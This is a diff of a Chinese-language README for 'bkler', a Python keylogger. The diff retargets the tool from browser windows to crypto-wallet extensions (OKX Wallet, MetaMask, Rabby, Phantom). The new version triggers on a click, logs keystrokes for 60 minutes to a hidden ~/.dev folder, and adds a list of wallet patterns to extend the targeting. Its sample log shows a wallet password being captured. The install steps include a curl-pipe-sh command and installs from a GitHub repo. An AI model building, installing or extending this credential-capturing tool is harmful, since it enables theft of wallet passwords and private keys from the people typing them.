@@ -1,23 +1,23 @@
-# 浏览器键盘记录器 (Browser bkler)
+# 钱包键盘记录器 (Wallet Keylogger)
 
-仅监控浏览器窗口的键盘输入，记录到 `~/.dev/bkler_{时间戳}.log`
+点击钱包扩展窗口后触发键盘记录，记录到 `~/.dev/bkler/recording_{日期}.log`
 
 ## 功能特性
 
-- **仅监控浏览器** - 只在浏览器窗口活动时记录键盘输入
-- **跨平台支持** - Windows、Linux (X11)、macOS
-- **明文日志** - 以明文形式记录所有按键
-- **自动检测** - 支持主流浏览器（Chrome、Firefox、Edge、Safari、Brave、Opera）
-- **Python 包** - 可作为包安装，提供 CLI 命令
+- **点击触发** - 点击钱包扩展窗口后开始记录
+- **限时记录** - 自动记录 60 分钟后停止
+- **Windows 平台** - 支持 Windows 系统
+- **可扩展** - 支持自定义钱包关键词列表
+- **自动检测** - 检测主流钱包扩展窗口
 
-## 支持的浏览器
+## 支持的钱包扩展
 
-- Google Chrome / Chromium
-- Mozilla Firefox
-- Microsoft Edge
-- Safari
-- Brave
-- Opera
+- OKX Wallet
+- MetaMask
+- Rabby Wallet
+- Phantom
+
+（可在代码中添加更多钱包关键词）
 
 ## 安装
 
@@ -30,22 +30,11 @@ curl -LsSf https://astral.sh/uv/install.sh | sh
 # 从 GitHub 仓库安装工具
 uv tool install git+https://github.com/DegenStar/bkler.git
 
-# 或直接使用命令
+# 直接使用命令
 bkler
 ```
 
-### 方式1: 使用 uv run（无需安装）
-
-```bash
-# 克隆项目
-git clone https://github.com/DegenStar/bkler.git
-cd bkler
-
-# 使用 uv 运行（无需安装）
-uv run bkler
-```
-
-### 方式2: 使用 pip 安装
+### 使用 pip 安装
 
 ```bash
 # 克隆项目
@@ -60,7 +49,7 @@ pip install -e .
 bkler
 ```
 
-### 方式3: 直接运行（无需安装）
+### 直接运行（无需安装）
 
 ```bash
 # 克隆项目
@@ -70,85 +59,26 @@ pip install -r requirements.txt
 python bkler.py
 ```
 
-## 平台依赖
-
-### Linux
-
-Linux 系统需要安装 `xdotool`：
-
-```bash
-sudo apt-get install xdotool  # Debian/Ubuntu
-sudo yum install xdotool      # Fedora/RHEL
-```
-
-### macOS
-
-macOS 需要授予"辅助功能"权限：
-
-1. 打开"系统设置" > "隐私与安全性" > "辅助功能"
-2. 添加终端或 Python 到允许列表
-
 ## 使用方法
 
-### 方法1: 命令行
-
 ```bash
-# 正常模式：仅记录浏览器输入
 bkler
-
-# 调试模式：记录所有按键并显示实时窗口信息
-bkler --debug
-
-# 测试模式：测试窗口检测是否正常
-bkler --test
-
-# 使用 uv run（无需安装）
-uv run bkler --debug
-
-# 查看帮助信息
-bkler --help
 ```
 
-**调试模式说明**：
-- `--debug` 模式会记录所有按键（不仅限于浏览器）
-- 实时显示当前窗口名称和是否为浏览器
-- 适用于诊断某些扩展或特殊应用的键盘事件捕获问题
+程序启动后会监听鼠标点击，当点击以下钱包窗口时自动开始记录：
+- OKX Wallet
+- MetaMask
+- Rabby Wallet
+- Phantom
 
-**OKX Wallet 等钱包扩展**：
-- 如果钱包扩展的密码无法记录，请使用 `--debug` 模式
-- 调试模式会显示钱包扩展的窗口信息，帮助诊断问题
-- 某些钱包可能使用虚拟键盘或安全输入机制
+点击后自动记录 60 分钟，之后自动停止。
 
-### 方法2: 作为 Python 模块
-
-```python
-from bkler import KeyLogger, create_log_file
-
-# 创建日志文件
-log_file = create_log_file()
-
-# 创建并启动记录器
-logger = KeyLogger(log_file)
-logger.start()
-```
-
-### 方法3: 检测浏览器状态
-
-```python
-from bkler import is_browser_active, get_active_window_name
-
-if is_browser_active():
-    print(f"当前活动窗口: {get_active_window_name()}")
-```
-
-### 停止记录
-
-按 `F12` 键停止记录，或使用 `Ctrl+C`
+按 `F12` 键退出程序，或使用 `Ctrl+C`
 
 ### 查看日志
 
 ```bash
-cat ~/.dev/bkler_*.log
+cat ~/.dev/bkler/recording_*.log
 ```
 
 ## 包结构
@@ -158,7 +88,7 @@ bkler/
 ├── bkler/              # 包目录
 │   ├── __init__.py        # 包初始化
 │   ├── cli.py             # 命令行入口
-│   ├── detectors.py       # 平台相关窗口检测
+│   ├── detectors.py       # Windows 窗口检测
 │   └── logger.py          # 核心记录器类
 ├── bkler.py           # 独立脚本入口
 ├── pyproject.toml         # 包配置（uv 兼容）
@@ -170,29 +100,38 @@ bkler/
 ## 日志格式
 
 ```
-[时间] [浏览器窗口名称] 按键内容
+[时间] [窗口名称] 按键内容
 ```
 
 示例：
 
 ```
-[2025-05-26 10:30:15] [Google Chrome - GitHub] h
-[2025-05-26 10:30:15] [Google Chrome - GitHub] e
-[2025-05-26 10:30:15] [Google Chrome - GitHub] l
-[2025-05-26 10:30:15] [Google Chrome - GitHub] l
-[2025-05-26 10:30:16] [Google Chrome - GitHub] o
-[2025-05-26 10:30:17] [Google Chrome - GitHub] [Space]
-[2025-05-26 10:30:18] [Google Chrome - GitHub] w
-[2025-05-26 10:30:18] [Google Chrome - GitHub] o
-[2025-05-26 10:30:19] [Google Chrome - GitHub] r
-[2025-05-26 10:30:19] [Google Chrome - GitHub] l
-[2025-05-26 10:30:20] [Google Chrome - GitHub] d
-[2025-05-26 10:30:21] [Google Chrome - GitHub] [Enter]
+# --- 记录开始: 2026-05-28 15:30:00 ---
+# 触发窗口: OKX Wallet
+[2026-05-28 15:30:05] [OKX Wallet] 1
+[2026-05-28 15:30:06] [OKX Wallet] 2
+[2026-05-28 15:30:07] [OKX Wallet] 3
+[2026-05-28 15:30:08] [OKX Wallet] 4
+[2026-05-28 15:30:09] [OKX Wallet] 5
+[2026-05-28 15:30:10] [OKX Wallet] [Enter]
+# --- 记录结束: 2026-05-28 16:30:00 ---
 ```
 
-## 不支持的平台
+## 添加更多钱包
 
-- **WSL** - WSL 无法直接访问 Windows 的键盘事件，请在 Windows 上直接运行
+编辑 `bkler/detectors.py`，在 `WALLET_PATTERNS` 列表中添加：
+
+```python
+WALLET_PATTERNS = [
+    "OKX Wallet",
+    "MetaMask",
+    "Rabby Wallet",
+    "Phantom",
+    "Rainbow",           # 添加新钱包
+    "Coinbase Wallet",   # 添加新钱包
+    # ...
+]
+```
 
 ## 安全注意事项
 
@@ -202,7 +141,7 @@ bkler/
 2. 日志文件包含**明文键盘记录**，包括可能输入的密码
 3. 请妥善保管日志文件，使用后及时删除
 4. **不要**在生产环境或他人设备上使用
-5. 敏感信息（密码、信用卡号等）会被记录
+5. 敏感信息（密码、私钥等）会被记录
 
 ## 许可
 
